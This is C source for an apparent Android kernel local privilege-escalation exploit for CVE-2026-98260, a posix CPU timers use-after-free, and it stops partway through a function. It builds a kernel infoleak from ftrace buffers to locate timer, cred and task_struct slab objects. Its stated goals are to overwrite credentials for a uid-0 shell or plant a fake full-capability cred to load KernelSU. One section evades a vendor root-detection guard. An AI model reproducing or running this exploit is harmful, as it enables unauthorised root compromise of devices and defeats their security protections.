/* SPDX-License-Identifier: MIT
 * Adapted from woshigenm/CVE-2026-98260 (MIT). */

/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Kernels: timer/kbuilds/ (indexed by timer/kbuilds.h), picked from uname -r
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * The trigger and slab layout are the same; per-build trace call sites, data
 * symbols and BTF offsets live in timer/kbuilds/, and the tracefs event ids
 * are discovered at runtime.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android16-6.12 module.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdarg.h>
#ifndef TIMER_NO_ZLIB
#include <zlib.h>
#endif
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>

#include "kbuilds.h"
#include "profile_fields.h"

#define TR "/sys/kernel/tracing"
/* The compiled victim preference, used only when the platform exposes no
 * cpufreq; the layout otherwise takes the fastest verified CPU. */
#define CPU_TRIG 2
/* The per-CPU trace buffers the taxonomy reads (g_rawfd, ensure_raw). */
#define TRACE_CPUS 8
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192
/* task_struct_cachep allocation size seen on some point releases of this
 * family where the allocator reports 0x1440 rounded up; accepted next to the
 * profile's BTF size. */
#define TASK_ALLOC_ALT 0x1640ULL

/* Per-build values (trace anchors, link-time data symbols, BTF layout, SLUB
 * sizes) live in kbuilds.h and are selected from `uname -r` at startup. */
#define TRIGGER_KILLABLE 1u
#define TRIGGER_CORE_STATE 2u

static const struct kbuild *g_kbuild;
/* The exec trigger: from the profile document (1 or 2); a legacy compiled-in
 * build or a real-only legacy document keeps the signal default. */
static unsigned g_trigger = TRIGGER_KILLABLE;

#define STATIC_TIMER_SITE (g_kbuild->static_timer_site)
#define TIMER_SITE_LOW21 (g_kbuild->timer_site_low21)
#define COPY_PROCESS_LOW21 (g_kbuild->copy_process_low21)
#define SELINUX_STATE_STATIC (g_kbuild->selinux_state)
#define PANIC_ON_WARN_STATIC (g_kbuild->panic_on_warn)
#define ROOT_USER_STATIC (g_kbuild->root_user)
#define INIT_USER_NS_STATIC (g_kbuild->init_user_ns)
#define INIT_UCOUNTS_STATIC (g_kbuild->init_ucounts)
#define INIT_GROUPS_STATIC (g_kbuild->init_groups)
#define OFF_TASK_CRED (g_kbuild->off_task_cred)
#define CRED_UID_OFF (g_kbuild->cred_uid_off)
#define CRED_REQ (g_kbuild->cred_req)
#define CRED_ALLOC (g_kbuild->cred_alloc)
#define TIMER_ALLOC (g_kbuild->timer_alloc)
#define TASK_ALLOC_BYTES (g_kbuild->task_alloc_bytes)
#define TRIGGER (g_trigger)
/*
 * The dump's size is part of the trigger: its page-cache writes split the
 * freed order-1 block.  The block is freed to the zone's buddy lists, which
 * every CPU shares (order-1 frees bypass the per-CPU page lists), so the
 * crasher's CPU does not isolate it: R3b.1 measured splits in 4 of 5 landed
 * attempts at 64 MiB and 1 of 2 at 16 MiB.  The bound stays the
 * measured-working margin; a series would fix the rate.
 */
#define CORE_LIMIT (16u << 20)

/* Kernel-independent. */
#define FULLCAP 0x1ffffffffffULL
#define SELINUX_SID_KERNEL 1U

/*
 * The fake-cred overlay and the timer node offset.  The compiled values are
 * the 6.12 layout the PoC was written against; a profile document whose
 * block carries the fake group replaces both.  The real path uses only the
 * kbuild's five constants.
 */
static struct cred_layout g_cred = {
    .usage_size = 8,
    .caps_offset = 0x30,
    .caps_count = 5,
    .security_offset = 0x80,
    .user_offset = 0x88,
    .user_ns_offset = 0x90,
    .ucounts_offset = 0x98,
    .group_info_offset = 0xa0,
    .sid_offset = 4,
};
static unsigned g_timer_node_off = 0x78;
/* mm_page_alloc record: gfp_flags at 0x18 as an unsigned long on 6.x; the
 * 5.10 event keeps it at 0x14 as an unsigned int.  A profile carries the
 * image's layout; the compiled default is the 6.x one. */
static unsigned g_page_gfp_off = 0x18;
static unsigned g_page_gfp_size = 8;
static const char *g_profile_path;

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid, g_crash_now;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
/* R3b.2: the exec thread writes one byte here immediately before execve; the
 * parent starts the early spray on it (child -> parent pipe). */
static int g_arm_r = -1, g_arm_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
/* R3b.10 boundary: the trigger window carries no usermode syscall.  The kill
 * thread records the zap/SIGKILL in memory; the parent logs it at the
 * verdict.  The crasher's "armed" line is behind TIMER_CRASH_LOG (diagnostic
 * only: its fsync was the lost landing, timer-quiet-logging-2026-11-21). */
static volatile int g_dump_kill_seen = -1, g_dump_kill_pid;
/*
 * The 5.10 writer gate (TIMER_GATE=1, experiment).  A CLONE_VM helper holds
 * the fragmented range's mmap write lock with one long mprotect while the
 * crasher's coredump write request queues behind it.  The exec thread waits
 * until the crasher is seen blocked (D) on that lock before it execve's, so
 * exec_mmap's read lock queues behind a writer and the zap's core_state is
 * necessarily observed.  Without the gate the exec's read can win a free
 * lock (the R3b.3 CLD_EXITED runs) or the zap can beat de_thread (-EAGAIN).
 */
static int g_gate_env;
static _Atomic int g_gate_go, g_gate_in, g_gate_hold_us, g_crasher_pid;
static _Atomic int g_sentinel_pid;
struct plant_ids { int tid, crasher, sentinel; };
/* TIMER_SPRAY_IDLE=1: the spray threads sleep instead of sched_yield in the
 * pre-burst wait, keeping the victim CPU free through the trigger. */
static int g_spray_idle;
/* TIMER_LEADER_AWAY=1: the target's main thread (the plant leader) spins on
 * sched_yield while de_thread waits to kill it; keep it off the victim CPU
 * so only the exec thread and the crasher compete there. */
static int g_leader_away;
/* TIMER_KILL_DUMP=1: a sentinel's pending SIGKILL marks the coredump's zap;
 * the parent then SIGKILLs the dumper.  The dump's page-cache allocations are
 * the post-free splitter of the victim slab; the slab frees (exit_itimers)
 * before the dumper finishes, so aborting the dump after the zap removes every
 * allocation that can take the block.  dump_interrupted() aborts on a fatal
 * signal; the free is >=155 ms after the zap, so a 200us poll is ample. */
static int g_kill_dump;
/* Per-stage plant attempts for the way-2 chain.  The 5.10 landing is ~56 %,
 * so three attempts leave an ~8.5 % miss per stage and ~30 % per chain;
 * eight leaves <0.2 % per stage.  Env TIMER_STAGE_ATTEMPTS overrides. */
static int g_stage_attempts = 8;
/*
 * Runtime CPU layout (R3b.1).  The victim's CPU carries the target, its
 * exec thread, the core_state crasher (the R3 choreography measures: the
 * crash must beat de_thread's zap of the thread group) and a reclaim spray
 * thread; it is the fastest verified CPU, per the GhostLock rule.  The tool's
 * own trace scanning is a bulk kernel writer and sits on the fastest
 * remaining verified CPU.  The layout is derived at startup from the affinity
 * mask and verified by the sched_setaffinity read-back: a CPU can be online
 * and still refuse a task (the vendor WALT core_ctl keeps cluster CPUs out
 * of the active mask), and an unchecked pin is how that class slipped before.
 */
struct cpu_layout
{
    int victim, log;
    int locker[LOCKERS];
    int n_locker;
    int spray[TRACE_CPUS];
    int n_spray;
};
static struct cpu_layout g_cpus = {CPU_TRIG, CPU_TRIG, {1, 3, 3}, LOCKERS,
                                   {CPU_TRIG}, 1};
/* Verified CPUs, ascending; and the `cpu <n>` diagnostic override (-1:none). */
static int g_avail[TRACE_CPUS], g_n_avail;
static int g_victim_pref = -1;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

/* --- spin wake (vendor root-guard evasion) ---------------------------------
 * The leak child's cred is planted while it waits for the go.  Blocked in
 * read(3), that transition straddles a syscall, and a vendor guard that
 * compares credentials at syscall entry/exit (OPlus SecureGuard) kills the
 * child at the read's exit.  With TIMER_SPIN_WAKE (default on) the child
 * waits in a shared page instead: it re-pins off the trigger's CPUs, writes
 * the hello, publishes ready, and spins in user space with no syscall across
 * the write; the parent releases it after the plant.  TIMER_SPIN_WAKE=0
 * restores the pipe wake (A/B). */
static int g_spin_wake = 1;
static volatile unsigned *g_wake_page;
static int g_wake_fd = -1;
#define WAKE_READY 0
#define WAKE_GO 1
#define WAKE_CPU 2

static int wake_create(void)
{
    char path[64];
    int fd;

#ifdef SYS_memfd_create
    fd = (int)syscall(SYS_memfd_create, "ghostlock-timer-wake", 0);
#else
    fd = (int)syscall(279, "ghostlock-timer-wake", 0);
#endif
    if (fd < 0)
    {
        snprintf(path, sizeof path, "/data/local/tmp/.gl-wake-%d", (int)getpid());
        fd = open(path, O_RDWR | O_CREAT | O_EXCL, 0600);
        if (fd >= 0)
            (void)unlink(path);
    }
    if (fd >= 0 && ftruncate(fd, 4096))
    {
        close(fd);
        fd = -1;
    }
    return fd;
}

/* A verified CPU outside the trigger roles: the crasher and the exec share the
 * victim CPU and the lockers use their own, so a spinner there would compete
 * with the landing.  The log CPU is the fallback. */
static int wake_cpu(void)
{
    for (int i = 0; i < g_n_avail; i++)
    {
        int c = g_avail[i], used = 0;

        if (c == g_cpus.victim || c == g_cpus.log)
            used = 1;
        for (int k = 0; k < g_cpus.n_locker; k++)
            if (c == g_cpus.locker[k])
                used = 1;
        if (!used)
            return c;
    }
    return g_cpus.log;
}


static void logf(const char *fmt, ...);
static int task_state(int pid);
static int task_wchan(int pid, char *buf, size_t cap);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static int pin_cpu(int cpu, const char *who)
{
    cpu_set_t set, got;

    if (cpu < 0 || cpu >= CPU_SETSIZE)
        return -1;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
    {
        logf("[cpu] %s: cpu%d refused (%s)\n", who, cpu, strerror(errno));
        return -1;
    }
    CPU_ZERO(&got);
    if (sched_getaffinity(0, sizeof(got), &got) || !CPU_ISSET(cpu, &got))
    {
        logf("[cpu] %s: cpu%d missing from the read-back\n", who, cpu);
        return -1;
    }
    return 0;
}
/* Pin to `pref`; on refusal take any verified CPU except `avoid`.  Used by
 * the roles that must not land on the victim (the crasher, the spray). */
static int pin_away(int pref, int avoid, const char *who)
{
    if (pref != avoid && !pin_cpu(pref, who))
        return 0;
    for (int i = 0; i < g_n_avail; i++)
        if (g_avail[i] != avoid && g_avail[i] != pref &&
            !pin_cpu(g_avail[i], who))
        {
            logf("[cpu] %s: moved to cpu%d\n", who, g_avail[i]);
            return 0;
        }
    logf("[cpu] %s: no CPU away from cpu%d accepted\n", who, avoid);
    return -1;
}
/* Pin to `pref`; on refusal take any verified CPU.  The role's preference is
 * best-effort; the refusal is logged either way. */
static int pin_role(int pref, const char *who)
{
    if (!pin_cpu(pref, who))
        return 0;
    for (int i = 0; i < g_n_avail; i++)
        if (g_avail[i] != pref && !pin_cpu(g_avail[i], who))
        {
            logf("[cpu] %s: moved from cpu%d to cpu%d\n", who, pref,
                 g_avail[i]);
            return 0;
        }
    logf("[cpu] %s: no verified CPU accepted\n", who);
    return -1;
}
/* The CPU's hardware maximum frequency in kHz, or 0 when cpufreq is not
 * exposed.  The victim and the logger take the fastest verified CPUs (the
 * GhostLock rule): the exec path, the crash and the free all run there. */
static unsigned long cpu_max_freq(int cpu)
{
    static const char *const names[] = {"cpuinfo_max_freq",
                                        "scaling_max_freq"};
    char path[128], buf[32];

    for (unsigned i = 0; i < sizeof(names) / sizeof(names[0]); i++)
    {
        ssize_t n;
        int fd;

        snprintf(path, sizeof(path),
                 "/sys/devices/system/cpu/cpu%d/cpufreq/%s", cpu, names[i]);
        fd = open(path, O_RDONLY);
        if (fd < 0)
            continue;
        n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0)
            continue;
        buf[n] = 0;
        return strtoul(buf, NULL, 10);
    }
    return 0;
}
/*
 * Derive the layout from the running mask.  Each allowed CPU is probed once
 * (the pin's own read-back is the availability evidence); the victim and the
 * logger take the fastest verified CPUs, the lockers the next ones, and the
 * spray covers every verified CPU starting with the victim.
 */
static void derive_cpus(void)
{
    cpu_set_t set;
    int allowed[TRACE_CPUS], n_allowed = 0;
    int victim = -1, lg = -1, vi = -1, li = -1;
    unsigned long freq[TRACE_CPUS] = {0};

    CPU_ZERO(&set);
    if (sched_getaffinity(0, sizeof(set), &set))
    {
        logf("[cpu] sched_getaffinity failed (%s); compiled layout\n",
             strerror(errno));
        pin_cpu(g_cpus.log, "main");
        return;
    }
    for (int c = 0; c < TRACE_CPUS; c++)
        if (CPU_ISSET(c, &set))
            allowed[n_allowed++] = c;
    for (int i = 0; i < n_allowed; i++)
        if (!pin_cpu(allowed[i], "probe"))
            g_avail[g_n_avail++] = allowed[i];
    if (!g_n_avail)
    {
        logf("[cpu] no allowed CPU accepts a pin; compiled layout\n");
        pin_cpu(g_cpus.log, "main");
        return;
    }
    for (int i = 0; i < g_n_avail; i++)
        freq[i] = cpu_max_freq(g_avail[i]);
    logf("[cpu] freqs");
    for (int i = 0; i < g_n_avail; i++)
        logf(" cpu%d=%lu", g_avail[i], freq[i]);
    logf("\n");
    /* The `cpu <n>` diagnostic override wins when verified. */
    if (g_victim_pref >= 0)
        for (int i = 0; i < g_n_avail; i++)
            if (g_avail[i] == g_victim_pref)
            {
                vi = i;
                break;
            }
    if (vi < 0 && g_victim_pref >= 0)
        logf("[cpu] victim preference cpu%d is not verified\n", g_victim_pref);
    /* Else the fastest verified CPU, ties to the lowest id. */
    if (vi < 0)
        for (int i = 0; i < g_n_avail; i++)
            if (freq[i] && (vi < 0 || freq[i] > freq[vi]))
                vi = i;
    /* No cpufreq exposed: the compiled preference, else the first verified. */
    if (vi < 0)
        for (int i = 0; i < g_n_avail; i++)
            if (g_avail[i] == CPU_TRIG)
            {
                vi = i;
                break;
            }
    if (vi < 0)
        vi = 0;
    victim = g_avail[vi];
    /* The logger takes the fastest remaining verified CPU. */
    for (int i = 0; i < g_n_avail; i++)
        if (i != vi && freq[i] && (li < 0 || freq[i] > freq[li]))
            li = i;
    if (li < 0)
        for (int i = 0; i < g_n_avail; i++)
            if (i != vi)
            {
                li = i;
                break;
            }
    if (li < 0)
        li = vi;
    lg = g_avail[li];
    g_cpus.victim = victim;
    g_cpus.log = lg;
    g_cpus.n_locker = 0;
    for (int i = 0; i < g_n_avail && g_cpus.n_locker < LOCKERS; i++)
        if (g_avail[i] != victim && g_avail[i] != lg)
            g_cpus.locker[g_cpus.n_locker++] = g_avail[i];
    for (int i = 0; i < g_n_avail && g_cpus.n_locker < LOCKERS; i++)
        if (g_avail[i] != victim)
            g_cpus.locker[g_cpus.n_locker++] = g_avail[i];
    if (!g_cpus.n_locker)
    {
        g_cpus.locker[0] = victim;
        g_cpus.n_locker = 1;
    }
    g_cpus.n_spray = 0;
    g_cpus.spray[g_cpus.n_spray++] = victim;
    for (int i = 0; i < g_n_avail; i++)
        if (g_avail[i] != victim)
            g_cpus.spray[g_cpus.n_spray++] = g_avail[i];
    logf("[cpu] layout victim=%d(%lu) log=%d(%lu) lockers=", victim, freq[vi],
         lg, freq[li]);
    for (int i = 0; i < g_cpus.n_locker; i++)
        logf("%s%d", i ? "," : "", g_cpus.locker[i]);
    logf(" spray=");
    for (int i = 0; i < g_cpus.n_spray; i++)
        logf("%s%d", i ? "," : "", g_cpus.spray[i]);
    logf(" (verified %d/%d)\n", g_n_avail, n_allowed);
    pin_role(g_cpus.log, "main");
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    /* The victim's CPU carries the target's records; the logger's carries
     * the tool's own probes (page-type ids, base calibration). */
    drain_cpu(g_cpus.victim);
    if (g_cpus.log != g_cpus.victim)
        drain_cpu(g_cpus.log);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

/*
 * Best-effort trace health: the per-CPU byte counters.  A nonzero drop or
 * overrun means the verdict is being drawn from an incomplete record; the
 * field is cumulative since the buffer was created, so read it as a health
 * line, not a per-attempt count.  The stats file is root:readtracefs; a
 * context that cannot read it gets -1 and no numbers.
 */
static long trace_stat(int cpu, const char *field)
{
    char path[160], line[160];
    size_t fl = strlen(field);
    FILE *fp;
    long v = -1;

    snprintf(path, sizeof path, TR "/per_cpu/cpu%d/stats", cpu);
    fp = fopen(path, "r");
    if (!fp)
        return -1;
    while (fgets(line, sizeof line, fp))
    {
        if (!strncmp(line, field, fl) && line[fl] == ':')
        {
            v = atol(line + fl + 1);
            break;
        }
    }
    fclose(fp);
    return v;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        /*
         * Either field may carry the profile's size: SLUB reports the
         * request in bytes_req and the slab object size in bytes_alloc,
         * and they differ where the freelist word sits past the object
         * (5.10.136: 264/272).  Same rule as scan_task_allocs.
         */
        if ((u64(b, i + 16) != TIMER_ALLOC &&
             u64(b, i + 24) != TIMER_ALLOC) || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
            req != TASK_ALLOC_ALT && alloc != TASK_ALLOC_ALT)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

/*
 * TIMER_DIAG_TASK=1: print the parent's allocations in the task-struct size
 * range (and any record whose low21 matches the expected site), so the
 * task-leak derivation can be checked against the runtime record shape without
 * a compiled-in guess.
 */
static void diag_task_scan(const unsigned char *b, size_t n, int pid)
{
    int shown = 0, hits = 0;
    int low_hits = 0, size_hits = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc, low;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        low = site & 0x1fffffULL;
        if (low == COPY_PROCESS_LOW21)
            low_hits++;
        if (req >= 4000 && req <= 8192)
            size_hits++;
        if (low != COPY_PROCESS_LOW21 &&
            !(req >= 4000 && req <= 8192) &&
            !(alloc >= 4000 && alloc <= 8192))
            continue;
        hits++;
        if (shown < 48)
        {
            logf("[diag-task] low21=%#llx req=%llu alloc=%llu ptr=%#llx%s%s\n",
                 low, req, alloc, ptr,
                 low == COPY_PROCESS_LOW21 ? " low-match" : "",
                 (req == TASK_ALLOC_BYTES || alloc == TASK_ALLOC_BYTES ||
                  req == TASK_ALLOC_ALT || alloc == TASK_ALLOC_ALT) ? " size-match" : "");
            shown++;
        }
    }
    logf("[diag-task] pid=%d want_low21=%#llx want_size=%llu shown=%d hits=%d "
         "low_hits=%d size_hits=%d\n",
         pid, COPY_PROCESS_LOW21, TASK_ALLOC_BYTES, shown, hits, low_hits, size_hits);
}


static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    if (!g_t_page_free)
        return 0;
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned first_type, second_type;
    unsigned long long first_pos, second_pos;
    unsigned hits;
};

/*
 * The kernel publishes each trace event's id in tracefs.  Reading it directly
 * is exact; the pairing below is the fallback for when the id file is not
 * readable by this context (it is root:readtracefs and some ROMs narrow it).
 * The pairing alone is not trustworthy: an unrelated event whose record
 * carries a pfn-shaped field can win a handful of pfns (6.6.66: the tool
 * scanned for sched_move_numa, id 113, as the page-free event).
 */
static int read_event_id(const char *name, unsigned *out)
{
    char path[160], buf[32];
    int fd;
    ssize_t r;

    snprintf(path, sizeof path, TR "/events/kmem/%s/id", name);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0)
        return -1;
    buf[r] = 0;
    *out = (unsigned)strtoul(buf, NULL, 10);
    return *out ? 0 : -1;
}

/*
 * Page event ids are assigned at boot; the id files are the primary source
 * (see read_event_id).  The fallback allocates/frees anonymous pages and
 * pairs the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    /* The probe pages were touched by this (logger) thread. */
    n = read_cpu(g_cpus.log, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].first_type)
                {
                    pairs[k].first_type = type;
                    pairs[k].first_pos = i;
                }
                else if (!pairs[k].second_type &&
                         type != pairs[k].first_type)
                {
                    pairs[k].second_type = type;
                    pairs[k].second_pos = i;
                }
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].first_type = type;
            pairs[np].first_pos = i;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct
        {
            unsigned a, b;
            int cnt;
        } tp[512];
        int ntp = 0, best_cnt = 0;
        unsigned t1 = 0, t2 = 0;
        unsigned vote_a = 0, vote_b = 0;

        /*
         * Select by how many pfns carry the same unordered type pair, not by
         * one pfn's hit count: the real alloc/free pair appears across the
         * whole test, while a coincidental pfn-shaped field in an unrelated
         * event appears on a handful of pfns.
         */
        for (int k = 0; k < np; k++)
        {
            unsigned a = pairs[k].first_type, b = pairs[k].second_type;
            unsigned lo, hi;
            int j;

            if (!a || !b || a == b)
                continue;
            lo = a < b ? a : b;
            hi = a < b ? b : a;
            for (j = 0; j < ntp; j++)
                if (tp[j].a == lo && tp[j].b == hi)
                {
                    tp[j].cnt++;
                    break;
                }
            if (j == ntp && ntp < (int)(sizeof(tp) / sizeof(tp[0])))
            {
                tp[ntp].a = lo;
                tp[ntp].b = hi;
                tp[ntp].cnt = 1;
                ntp++;
            }
        }
        for (int j = 0; j < ntp; j++)
            if (tp[j].cnt > best_cnt)
            {
                best_cnt = tp[j].cnt;
                t1 = tp[j].a;
                t2 = tp[j].b;
            }
        if (!t1 || !t2)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        /*
         * The first/second sighting is not the alloc/free order: a page can
         * be freed and reallocated inside the window, and which record the
         * ring keeps first varies per boot.  Decide by direction: across
         * every pair that contains the two ids, the type that is seen first
         * more often is the allocation (the churn allocates, then frees).
         */
        for (int k = 0; k < np; k++)
        {
            unsigned long long pos_a = 0, pos_b = 0;
            int has_a = 0, has_b = 0;

            if (pairs[k].first_type == t1)
            {
                pos_a = pairs[k].first_pos;
                has_a = 1;
            }
            if (pairs[k].second_type == t1)
            {
                pos_a = pairs[k].second_pos;
                has_a = 1;
            }
            if (pairs[k].first_type == t2)
            {
                pos_b = pairs[k].first_pos;
                has_b = 1;
            }
            if (pairs[k].second_type == t2)
            {
                pos_b = pairs[k].second_pos;
                has_b = 1;
            }
            if (has_a && has_b)
            {
                if (pos_a < pos_b)
                    vote_a++;
                else if (pos_b < pos_a)
                    vote_b++;
            }
        }
        if (vote_b > vote_a)
        {
            g_t_page_alloc = t2;
            g_t_page_free = t1;
        }
        else
        {
            g_t_page_alloc = t1;
            g_t_page_free = t2;
        }
        /*
         * Below the guard the pairing is not evidence: keep the alloc id
         * (the hit gate needs one positive event) and disable the free gate
         * rather than scan for a wrong event.  A disabled free gate costs
         * the phase-2 release; it must never cost a bad verdict.
         */
        if (best_cnt < 16 || best_cnt * 4 < np)
        {
            logf("[ids] page_alloc=%u page_free=%u pairs=%d votes=%u/%u "
                 "source=pairing weak=%d; free gate disabled\n",
